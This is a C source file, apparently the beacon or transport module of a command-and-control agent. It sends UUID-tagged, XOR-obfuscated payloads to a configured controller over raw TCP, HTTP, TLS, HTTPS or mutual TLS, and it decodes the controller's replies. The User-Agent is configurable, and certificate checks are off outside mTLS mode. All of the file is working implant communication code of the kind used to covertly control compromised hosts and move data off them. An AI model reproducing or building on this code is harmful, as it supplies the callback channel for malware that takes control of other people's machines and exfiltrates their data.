#define _XOPEN_SOURCE 600
#include "../include/Beacon.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
    #include <winsock2.h>
    typedef SOCKET NetSock;
    #define SockInvalid  INVALID_SOCKET
    #define SockClose(s) closesocket(s)
#else
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <sys/socket.h>
    #include <unistd.h>
    typedef int NetSock;
    #define SockInvalid  (-1)
    #define SockClose(s) close(s)
#endif

#ifdef HaveOpenssl
    #include <openssl/ssl.h>
    #include <openssl/err.h>
#endif

#define XorKey 0x5A

static void ApplyXor(char *D, size_t L)
{
    for (size_t I = 0; I < L; I++) D[I] ^= XorKey;
}

static NetSock TcpDial(const char *Host, int Port)
{
    NetSock S = socket(AF_INET, SOCK_STREAM, 0);
    if (S == SockInvalid) return SockInvalid;
    struct sockaddr_in Sin;
    memset(&Sin, 0, sizeof(Sin));
    Sin.sin_family      = AF_INET;
    Sin.sin_port        = htons((unsigned short)Port);
    Sin.sin_addr.s_addr = inet_addr(Host);
    if (connect(S, (struct sockaddr *)&Sin, sizeof(Sin)) < 0) {
        SockClose(S); return SockInvalid;
    }
    return S;
}

/*
 * Wire format: "<UUID>|<XOR-encrypted payload>"
 * UUID is sent in plaintext (36 bytes + '|') so the server can
 * identify the agent regardless of source port.
 * Only the payload after '|' is XOR-encrypted.
 */
static int BuildFrame(const char *Uuid, const char *Payload,
                      char *Out, size_t *OutLen)
{
    size_t PLen = strlen(Payload);
    size_t Total = 37 + PLen;
    if (Total >= BufSize) return 0;

    memcpy(Out, Uuid, 36);
    Out[36] = '|';
    memcpy(Out + 37, Payload, PLen);
    ApplyXor(Out + 37, PLen);
    *OutLen = Total;
    return 1;
}

static int BeaconTcp(const AgentConfig *C, const char *Uuid,
                     const char *Payload, char *Recv)
{
    NetSock S = TcpDial(C->Host, C->Port);
    if (S == SockInvalid) return 0;

    char Frame[BufSize];
    size_t FLen;
    if (!BuildFrame(Uuid, Payload, Frame, &FLen)) { SockClose(S); return 0; }
    send(S, Frame, (int)FLen, 0);

    int N = recv(S, Recv, BufSize - 1, 0);
    SockClose(S);
    if (N <= 0) return 0;
    Recv[N] = '\0';
    ApplyXor(Recv, (size_t)N);
    return 1;
}

static int BeaconHttp(const AgentConfig *C, const char *Uuid,
                      const char *Payload, char *Recv)
{
    NetSock S = TcpDial(C->Host, C->Port);
    if (S == SockInvalid) return 0;

    char Frame[BufSize];
    size_t FLen;
    if (!BuildFrame(Uuid, Payload, Frame, &FLen)) { SockClose(S); return 0; }

    char Req[BufSize];
    int RLen = snprintf(Req, BufSize,
                        "POST %s HTTP/1.1\r\n"
                        "Host: %s:%d\r\n"
                        "User-Agent: %s\r\n"
                        "Content-Type: application/octet-stream\r\n"
                        "Content-Length: %d\r\n"
                        "Connection: close\r\n"
                        "\r\n",
                        C->HttpPath, C->Host, C->Port,
                        C->UserAgent, (int)FLen);
    send(S, Req, RLen, 0);
    send(S, Frame, (int)FLen, 0);

    char Raw[BufSize] = {0};
    int N = recv(S, Raw, BufSize - 1, 0);
    SockClose(S);
    if (N <= 0) return 0;

    char *Body = strstr(Raw, "\r\n\r\n");
    if (!Body) return 0;
    Body += 4;
    int RL = N - (int)(Body - Raw);
    if (RL <= 0) return 0;
    memcpy(Recv, Body, (size_t)RL);
    Recv[RL] = '\0';
    ApplyXor(Recv, (size_t)RL);
    return 1;
}

#ifdef HaveOpenssl
static SSL_CTX *TlsBuildCtx(const AgentConfig *C)
{
    static int SslInit = 0;
    if (!SslInit) {
        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();
        SslInit = 1;
    }
    SSL_CTX *Ctx = SSL_CTX_new(TLS_client_method());
    if (!Ctx) return NULL;
    SSL_CTX_set_min_proto_version(Ctx, TLS1_2_VERSION);
    if (C->Mode == ModeMtls) {
        if (SSL_CTX_use_certificate_file(Ctx, C->CertFile, SSL_FILETYPE_PEM) <= 0 ||
            SSL_CTX_use_PrivateKey_file(Ctx, C->KeyFile,   SSL_FILETYPE_PEM) <= 0) {
            ERR_print_errors_fp(stderr); SSL_CTX_free(Ctx); return NULL;
        }
        if (!SSL_CTX_load_verify_locations(Ctx, C->CaFile, NULL)) {
            ERR_print_errors_fp(stderr); SSL_CTX_free(Ctx); return NULL;
        }
        SSL_CTX_set_verify(Ctx, SSL_VERIFY_PEER, NULL);
    } else {
        SSL_CTX_set_verify(Ctx, SSL_VERIFY_NONE, NULL);
    }
    return Ctx;
}

static int BeaconTls(const AgentConfig *C, const char *Uuid,
                     const char *Payload, char *Recv, int IsHttp)
{
    SSL_CTX *Ctx = TlsBuildCtx(C);
    if (!Ctx) return 0;
    int Fd = (int)TcpDial(C->Host, C->Port);
    if (Fd < 0) { SSL_CTX_free(Ctx); return 0; }
    SSL *Ssl = SSL_new(Ctx);
    SSL_set_fd(Ssl, Fd);
    SSL_set_tlsext_host_name(Ssl, C->Host);

    int Ok = 0;
    if (SSL_connect(Ssl) <= 0) { ERR_print_errors_fp(stderr); goto Done; }

    char Frame[BufSize];
    size_t FLen;
    if (!BuildFrame(Uuid, Payload, Frame, &FLen)) goto Done;

    if (IsHttp) {
        char Req[BufSize];
        int RLen = snprintf(Req, BufSize,
                            "POST %s HTTP/1.1\r\n"
                            "Host: %s:%d\r\n"
                            "User-Agent: %s\r\n"
                            "Content-Type: application/octet-stream\r\n"
                            "Content-Length: %d\r\n"
                            "Connection: close\r\n"
                            "\r\n",
                            C->HttpPath, C->Host, C->Port,
                            C->UserAgent, (int)FLen);
        SSL_write(Ssl, Req, RLen);
        SSL_write(Ssl, Frame, (int)FLen);
        char Raw[BufSize] = {0};
        int N = SSL_read(Ssl, Raw, BufSize - 1);
        if (N > 0) {
            char *B = strstr(Raw, "\r\n\r\n");
            if (B) {
                B += 4;
                int RL = N - (int)(B - Raw);
                if (RL > 0) {
                    memcpy(Recv, B, (size_t)RL);
                    Recv[RL] = '\0';
                    ApplyXor(Recv, (size_t)RL);
                    Ok = 1;
                }
            }
        }
    } else {
        SSL_write(Ssl, Frame, (int)FLen);
        int N = SSL_read(Ssl, Recv, BufSize - 1);
        if (N > 0) { Recv[N] = '\0'; ApplyXor(Recv, (size_t)N); Ok = 1; }
    }

Done:
    SSL_shutdown(Ssl); SSL_free(Ssl);
    SockClose((NetSock)Fd);
    SSL_CTX_free(Ctx);
    return Ok;
}
#endif

int BeaconSend(const AgentConfig *C, const char *Uuid,
               const char *Payload, char *Response)
{
    switch (C->Mode) {
        case ModeTcp:   return BeaconTcp(C, Uuid, Payload, Response);
        case ModeHttp:  return BeaconHttp(C, Uuid, Payload, Response);
#ifdef HaveOpenssl
        case ModeTls:   return BeaconTls(C, Uuid, Payload, Response, 0);
        case ModeHttps: return BeaconTls(C, Uuid, Payload, Response, 1);
        case ModeMtls:  return BeaconTls(C, Uuid, Payload, Response, 0);
#endif
        default:        return 0;
    }
}
